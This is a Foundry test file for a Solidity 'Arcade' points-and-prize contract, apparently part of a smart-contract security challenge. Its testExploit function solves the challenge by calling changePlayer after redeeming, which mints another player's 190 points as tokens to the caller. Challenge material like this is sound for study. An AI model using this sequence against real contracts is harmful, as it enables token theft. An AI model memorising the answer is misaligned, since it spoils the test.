// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Arcade} from "src/Arcade.sol";

contract ArcadeTest is Test {
    Arcade public arcade;

    address public you;
    address public player1;
    address public player2;
    address public player3;
    address public player4;

    uint256 public player1Points = 80 ether;
    uint256 public player2Points = 120 ether;
    uint256 public player3Points = 180 ether;
    uint256 public player4Points = 190 ether;

    function setUp() external {
        you = makeAddr("You");
        player1 = makeAddr("Player1");
        player2 = makeAddr("Player2");
        player3 = makeAddr("Player3");
        player4 = makeAddr("Player4");

        arcade = new Arcade(you);
        arcade.setScore(you, 0);
        arcade.setScore(player1, player1Points);
        arcade.setScore(player2, player2Points);
        arcade.setScore(player3, player3Points);
        arcade.setScore(player4, player4Points);

        vm.label(address(arcade), "Arcade");
    }

    function testSetUp() public {
        assertEq(arcade.currentPlayer(), you);
        assertEq(arcade.getCurrentPlayerPoints(), 0 ether);

        assertEq(arcade.scoreboard(player1), player1Points);
        assertEq(arcade.scoreboard(player2), player2Points);
        assertEq(arcade.scoreboard(player3), player3Points);
        assertEq(arcade.scoreboard(player4), player4Points);

        assertEq(arcade.numActivePlayers(), 5);
        assertEq(arcade.activePlayers(0), you);
        assertEq(arcade.activePlayers(1), player1);
        assertEq(arcade.activePlayers(2), player2);
        assertEq(arcade.activePlayers(3), player3);
        assertEq(arcade.activePlayers(4), player4);
    }

    function testEarn() public {
        vm.warp(10 minutes);
        vm.prank(you);
        arcade.earn();
        assertEq(arcade.scoreboard(you), 10 ether);
        assertEq(arcade.lastEarnTimestamp(), block.timestamp);
    }

    function testRedeem() public {
        vm.warp(10 minutes);
        vm.startPrank(you);
        arcade.earn();
        arcade.redeem();
        vm.stopPrank();
        assertEq(arcade.scoreboard(you), 0);
        assertEq(arcade.balanceOf(you), 10 ether);
    }

    function testChangePlayer() public {
        vm.prank(you);
        arcade.changePlayer(player1);
        assertEq(arcade.currentPlayer(), player1);
    }

    function testExploit() public {
        vm.warp(10 minutes);
        vm.startPrank(you);
        arcade.earn(); // Earn 10 points
        arcade.redeem(); // Mint 10 PRIZE
        arcade.changePlayer(player4); // Mint 190 PRIZE
        vm.stopPrank();

        assertEq(arcade.pass(), true);
    }
}
